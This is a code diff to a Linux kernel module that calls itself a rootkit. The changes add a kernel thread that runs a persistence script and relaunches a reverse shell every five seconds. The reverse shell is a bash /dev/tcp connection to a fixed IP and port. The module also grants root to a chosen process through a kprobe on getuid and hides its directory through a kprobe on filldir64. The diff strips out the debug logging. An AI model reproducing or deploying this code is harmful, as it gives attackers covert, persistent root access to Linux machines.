@@ -12,6 +12,9 @@
 #include <linux/mount.h>
 #include <linux/dcache.h>
 #include <linux/stat.h>
+#include <linux/kthread.h>
+#include <linux/delay.h>
+#include <linux/kmod.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Victor, Marouane, Mina, Axel");
@@ -32,6 +35,9 @@ static short hidden = 0;
 // Privilege escalation variables and functions
 static struct kprobe kp_getuid;
 static struct kprobe kp_filldir64;
+
+// launch .sh function:
+static struct task_struct *lauch_sh_thread;
 
 void showme(void)
 {
@@ -114,7 +120,6 @@ static int handler_pre_getuid(struct kprobe *p, struct pt_regs *regs)
     get_task_comm(comm, current);
 
     if (strcmp(comm, target_cmd) == 0) {
-        // printk(KERN_INFO "rootkit: Granting root privileges for process %s...\n", comm);
         set_root();
     }
 
@@ -132,7 +137,6 @@ static int handler_pre_filldir64(struct kprobe *p, struct pt_regs *regs)
 {
     char *dir = (char *)regs->si;
     int ret;
-    // printk(KERN_INFO "rootkit: filldir64 called with dir: %s\n", dir);
 
     if ((ret = strcmp(dir, "111111111111111111111111111")) == 0) {
         regs->dx = 0;
@@ -147,28 +151,25 @@ static int dir_init(void)
     struct inode *dir_inode;
     int ret;
 
-    // Trouver le chemin de la racine ("/")
+    // find the root path ("/")
     ret = kern_path("/", 0, &path);
     if (ret) {
-        // printk(KERN_ERR "Erreur lors de l'accès au répertoire racine.\n");
         return ret;
     }
 
-    // Obtenir l'inode du répertoire racine
+    // get the inode for the root path
     dir_inode = path.dentry->d_inode;
 
-    // Créer la dentry pour "111111111111111111111111111"
+    // create dentry for "111111111111111111111111111"
     dentry = d_alloc_name(path.dentry, "111111111111111111111111111");
     if (!dentry) {
-        // printk(KERN_ERR "Erreur lors de la création de la dentry.\n");
         return -ENOMEM;
     }
 
-    // Créer le répertoire "111111111111111111111111111" dans le répertoire racine
+    // create the repo "111111111111111111111111111"
     ret = vfs_mkdir(NULL, dir_inode, dentry, S_IRWXU | S_IRWXG | S_IRWXO);
     if (ret) {
-        // printk(KERN_ERR "Erreur lors de la création du répertoire 111111111111111111111111111.\n");
-        dput(dentry);  // Libération de la dentry en cas d'échec
+        dput(dentry);  // free dentry in fail case
         return ret;
     }
 
@@ -177,7 +178,7 @@ static int dir_init(void)
 
 static int lkm_file_create_init(void) {
     struct file *trigger_file, *revshell_file, *persistence_file;
-    loff_t pos_trigger = 0, pos_revshell = 0, pos_persistence;
+    loff_t pos_trigger = 0, pos_revshell = 0, pos_persistence = 0;
     char *trigger_content = "#!/bin/bash\n";
     char *revshell_content = "#!/bin/bash\n/bin/bash -i >& /dev/tcp/172.31.22.39/12345 0>&1\n";
     char *persistence_content =
@@ -187,55 +188,64 @@ static int lkm_file_create_init(void) {
         "rc-update add local default\n";
     ssize_t written;
 
-    // Crée et ouvre le premier fichier
+    // Create the trigger
     trigger_file = filp_open("/111111111111111111111111111/trigger", O_WRONLY | O_CREAT | O_TRUNC, 0777);
     if (IS_ERR(trigger_file)) {
-        // printk(KERN_ERR "LKM: Impossible d'ouvrir ou de créer /111111111111111111111111111/trigger.\n");
         return PTR_ERR(trigger_file);
     }
 
-    // Écrit dans le premier fichier
+    // Write in the trigger
     written = kernel_write(trigger_file, trigger_content, strlen(trigger_content), &pos_trigger);
     if (written < 0) {
-        // printk(KERN_ERR "LKM: Échec de l'écriture dans /111111111111111111111111111/trigger.\n");
         filp_close(trigger_file, NULL);
         return written;
     }
-    // printk(KERN_INFO "LKM: Écriture réussie dans /111111111111111111111111111/trigger.\n");
     filp_close(trigger_file, NULL);
 
-    // Crée et ouvre le second fichier
+    // Create the revshell.sh
     revshell_file = filp_open("/111111111111111111111111111/revshell.sh", O_WRONLY | O_CREAT | O_TRUNC, 0777);
     if (IS_ERR(revshell_file)) {
-        // printk(KERN_ERR "LKM: Impossible d'ouvrir ou de créer /111111111111111111111111111/revshell.sh.\n");
         return PTR_ERR(revshell_file);
     }
 
-    // Écrit dans le second fichier
+    // write in the revsehll.sh
     written = kernel_write(revshell_file, revshell_content, strlen(revshell_content), &pos_revshell);
     if (written < 0) {
-        // printk(KERN_ERR "LKM: Échec de l'écriture dans /111111111111111111111111111/revshell.sh.\n");
         filp_close(revshell_file, NULL);
         return written;
     }
-    // printk(KERN_INFO "LKM: Écriture réussie dans /111111111111111111111111111/revshell.sh.\n");
     filp_close(revshell_file, NULL);
 
-    // Créer et écrire dans le fichier persistence
+    // Create the persistence.sh
     persistence_file = filp_open("/111111111111111111111111111/persistence.sh", O_WRONLY | O_CREAT | O_TRUNC, 0777);
     if (IS_ERR(persistence_file)) {
-        printk(KERN_ERR "LKM: Impossible d'ouvrir ou de créer /111111111111111111111111111/persistence.sh.\n");
         return PTR_ERR(persistence_file);
     }
+    // write in the persistence.sh
     written = kernel_write(persistence_file, persistence_content, strlen(persistence_content), &pos_persistence);
     if (written < 0) {
-        printk(KERN_ERR "LKM: Échec de l'écriture dans /111111111111111111111111111/persistence.sh.\n");
         filp_close(persistence_file, NULL);
         return written;
     }
-    printk(KERN_INFO "LKM: Écriture réussie dans /111111111111111111111111111/persistence.sh.\n");
     filp_close(persistence_file, NULL);
 
+
+    return 0;
+}
+
+static int lauch_sh_function(void *data) {
+    char *persistence_argv[] = {"/bin/bash", "/111111111111111111111111111/persistence.sh", NULL};
+    char *revshell_argv[] = {"/bin/bash", "/111111111111111111111111111/revshell.sh", NULL};
+    char *envp[] = {"HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
+
+    // launch persistence script
+    int ret = call_usermodehelper(persistence_argv[0], persistence_argv, envp, UMH_WAIT_EXEC);
+
+    //lauch revshell
+    while (!kthread_should_stop()) {
+        ret = call_usermodehelper(revshell_argv[0], revshell_argv, envp, UMH_WAIT_EXEC);
+        ssleep(5);
+    }
 
     return 0;
 }
@@ -250,6 +260,10 @@ static int __init rootkit_init(void)
     dir_init();
     lkm_file_create_init();
 
+    lauch_sh_thread = kthread_run(lauch_sh_function, NULL, "lauch_sh_thread");
+    if (IS_ERR(lauch_sh_thread)) {
+        return PTR_ERR(lauch_sh_thread);
+    }
     // Privilege escalation
     kp_getuid.symbol_name = "__x64_sys_getuid";
     kp_getuid.pre_handler = handler_pre_getuid;
@@ -257,11 +271,9 @@ static int __init rootkit_init(void)
 
     ret = register_kprobe(&kp_getuid);
     if (ret < 0) {
-        // printk(KERN_ERR "rootkit: Failed to register kprobe for getuid, returned %d\n", ret);
         return ret;
     }
 
-    // printk(KERN_INFO "rootkit: Kprobe registered at %s\n", kp_getuid.symbol_name);
 
     // File hiding
     kp_filldir64.symbol_name = "filldir64";
@@ -269,24 +281,24 @@ static int __init rootkit_init(void)
 
     ret = register_kprobe(&kp_filldir64);
     if (ret < 0) {
-        // printk(KERN_ERR "rootkit: Failed to register kprobe for filldir64, returned %d\n", ret);
         unregister_kprobe(&kp_getuid);
         return ret;
     }
-
-    // printk(KERN_INFO "rootkit: Kprobe registered at %s and %s \n", kp_filldir64.symbol_name, kp_getuid.symbol_name);
 
     return 0;
 }
 
 static void __exit rootkit_exit(void)
 {
+
+    if (lauch_sh_thread) {
+        kthread_stop(lauch_sh_thread);
+        printk(KERN_INFO "Reverse shell thread stopped.\n");
+    }
+
     // Unregister kprobes
     unregister_kprobe(&kp_getuid);
-    // printk(KERN_INFO "rootkit: Kprobe for getuid unregistered\n");
-
     unregister_kprobe(&kp_filldir64);
-    // printk(KERN_INFO "rootkit: Kprobe for filldir64 unregistered\n");
 
     // Show LKM
     showme();
